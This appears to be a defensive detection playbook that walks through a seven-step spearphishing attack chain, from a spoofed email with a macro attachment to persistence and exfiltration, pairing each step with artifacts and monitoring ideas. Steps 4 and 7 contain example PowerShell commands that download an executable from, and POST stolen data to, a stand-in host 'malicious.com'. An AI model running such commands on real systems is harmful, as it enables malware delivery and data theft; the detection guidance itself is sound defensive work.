
1. **Email Delivery**
   - Application: Outlook
   - User Action: User receives a spearphishing email from a spoofed address (e.g., admin@338).
   - Key Artifacts: Email headers indicating spoofing, attachment named "Invoice.docx".
   - Detection: Monitor for emails with suspicious "From" addresses and attachments with common spearphishing file types.

2. **User Interaction**
   - Application: Outlook
   - User Action: User opens the email and clicks on the attachment.
   - Key Artifacts: User clicks on "Enable Content" to allow macros.
   - Detection: Monitor for user interactions with attachments and enabling macros.

3. **Execution of Malicious Macro**
   - Application: Microsoft Word
   - User Action: The macro executes upon enabling content.
   - Key Artifacts: Macro code that downloads a payload from a remote server.
   - Detection: Monitor for processes spawned from Word that execute scripts or download files.

4. **Payload Download**
   - Application: PowerShell
   - User Action: The macro triggers a PowerShell command to download a malicious executable.
   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\User\Downloads\payload.exe`
   - Detection: Monitor for PowerShell commands that download executables from suspicious URLs.

5. **Execution of Malicious Payload**
   - Application: Windows Explorer
   - User Action: User inadvertently runs the downloaded executable from the Downloads folder.
   - Key Artifacts: Executable file named "payload.exe" being executed.
   - Detection: Monitor for execution of files from the Downloads directory, especially those with unusual names or signatures.

6. **Establishing Persistence**
   - Application: Windows Task Scheduler
   - User Action: The malicious payload creates a scheduled task to ensure persistence.
   - Key Artifacts: Scheduled task created with a command to run the payload at startup.
   - Detection: Monitor for new scheduled tasks that execute unusual commands or point to suspicious executables.

7. **Data Exfiltration**
   - Application: PowerShell
   - User Action: The payload collects sensitive data and sends it to a command and control (C2) server.
   - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data`
   - Detection: Monitor for outbound connections to known malicious domains and unusual PowerShell network activity.
